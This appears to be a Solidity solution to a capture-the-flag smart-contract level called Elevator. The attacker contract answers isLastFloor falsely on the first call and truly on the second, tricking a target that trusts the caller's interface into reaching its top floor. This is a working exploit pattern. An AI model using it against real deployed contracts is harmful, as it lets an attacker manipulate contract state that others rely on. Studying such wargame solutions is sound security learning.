pragma solidity ^0.8.13;

contract ElevatorSolver {

    bool isSecondCall;

    constructor(){
        isSecondCall = false;
    }

    function solve(address target) public payable {
        Elevator elevator = Elevator(target);
        elevator.goTo(10); //The floor does not matter
    }

    function isLastFloor(uint) external returns (bool) {
        if (isSecondCall == false) {
            isSecondCall = true;
            return false;
        } else {
            isSecondCall = false;
            return true;
        }
    }
}
interface Elevator {
   function goTo(uint) external;
}